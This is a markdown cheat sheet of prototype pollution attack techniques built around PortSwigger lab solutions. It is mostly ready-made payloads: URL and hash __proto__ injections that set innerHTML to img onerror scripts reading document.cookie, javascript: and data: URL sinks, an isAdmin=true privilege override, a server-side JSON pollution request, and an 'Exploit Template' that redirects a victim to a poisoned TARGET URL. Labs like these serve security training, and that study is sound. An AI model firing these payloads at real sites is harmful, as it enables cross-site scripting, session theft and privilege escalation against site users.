# Prototype Pollution Attack Techniques

## What is Prototype Pollution?
JavaScript objects inherit from Object.prototype. Polluting the prototype affects ALL objects.

## PortSwigger Lab Solutions

### Lab: Client-side prototype pollution via browser APIs
**Approach**: Pollute Object.prototype to control DOM sinks

**Payload** (via URL):
```
https://TARGET/?__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

**Payload** (via hash):
```
https://TARGET/#__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

### Lab: DOM XSS via client-side prototype pollution
**Approach**: Pollute sink used by vulnerable library

**Step 1**: Find prototype pollution source
```
/?__proto__[foo]=bar
# Check if {}.foo === "bar" in console
```

**Step 2**: Find DOM sink
```
// innerHTML, document.write, eval
```

**Step 3**: Combine
```
/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>
```

## Common Sources
```
# URL parameters
/?__proto__[key]=value
/?constructor[prototype][key]=value

# URL hash
/#__proto__[key]=value

# JSON body
{"__proto__": {"key": "value"}}

# URL parsing flaws
/?__proto__[key]=value
```

## Common Sinks
```
# innerHTML
__proto__[innerHTML]=<img/src/onerror=alert(1)>

# eval
__proto__[src]=data:,alert(1)

# jQuery
__proto__[url]=javascript:alert(1)

# Document manipulation
__proto__[cookie]=stolen

# Settings override
__proto__[isAdmin]=true
```

## Detection
```javascript
// Check if prototype pollution is possible
location.search.includes("__proto__") || location.hash.includes("__proto__")

// Manual test
var a = {};
console.log(a.polluted); // undefined
// After pollution:
// Object.prototype.polluted = "yes"
console.log(a.polluted); // "yes"
```

## Exploit Template
```html
<script>
// Pollute via fetch or redirect
document.location = "https://TARGET/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>";
</script>
```

## Server-Side Prototype Pollution
```json
POST /api/user HTTP/1.1
{"username":"wiener","__proto__":{"isAdmin":true}}
# If server merges without sanitization, all objects get isAdmin=true
```
